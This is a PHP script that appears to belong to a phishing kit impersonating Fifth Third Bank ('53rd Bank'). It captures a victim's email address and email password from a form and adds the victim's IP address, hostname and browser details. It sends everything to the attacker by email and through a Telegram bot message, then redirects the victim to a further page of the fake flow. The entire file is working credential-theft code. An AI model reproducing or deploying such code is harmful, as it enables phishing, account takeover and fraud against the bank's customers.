<?php 


	ob_start();
session_start();
	include '../conf.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
			if ( isset( $_POST['email'] ) ) {
		
        $_SESSION['email'] 	  = $_POST['email'];
		$_SESSION['empass'] 	  = $_POST['empass'];
		$msg = <<<EOT
- 53rd Bank First Email | Password Info -
[Email Address] 		: {$_SESSION['email']}
[Email Password]		: {$_SESSION['empass']}
	- IP - Info -
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

 - end - 
\r\n\r\n
EOT;

		$subject = " 53RD Email Acess   From $ip";
        $headers = "From: Gohard2 <5r3d@gohard2.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
		@mail($mailto,$subject,$msg,$headers);
		
		$data = [
			'chat_id' => $chatid,
			'text' => $msg
		];
		$response = file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" . http_build_query($data) );



        header("Location: ../c20.php?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification");
        exit();
	} else {
		header("Location: ../index.php?");
		exit();
	}
?>